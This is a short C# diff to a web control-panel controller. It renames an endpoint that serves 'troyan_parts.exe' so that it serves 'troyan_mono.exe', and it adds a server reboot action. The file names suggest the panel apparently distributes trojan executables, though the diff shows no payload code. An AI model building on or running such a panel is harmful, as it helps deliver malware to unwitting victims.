@@ -212,10 +212,10 @@ public class CpController : Controller
         return GetFile(_serverService.GetExe(server), "troyan.exe");
     }
     
-    [HttpGet("{server}/GetExeNg")]
-    public IActionResult GetExeNg(string server)
+    [HttpGet("{server}/GetExeMono")]
+    public IActionResult GetExeMono(string server)
     {
-        return GetFile(_serverService.GetExeNg(server), "troyan_parts.exe");
+        return GetFile(_serverService.GetExeMono(server), "troyan_mono.exe");
     }
     
     protected async Task<IActionResult> GetFileAdvanced(string server, string file, string name, string random, string target, string randomMethod, string nofile)
@@ -299,6 +299,12 @@ public class CpController : Controller
             if (existingModel == null)
             {
                 return NotFound();
+            }
+
+            if (action == "reboot")
+            {
+                var res = _serverService.Reboot();
+                return View("Index", new ServerModel() { Server = updatedModel.Server, Result = res });
             }
 
             //embeddings
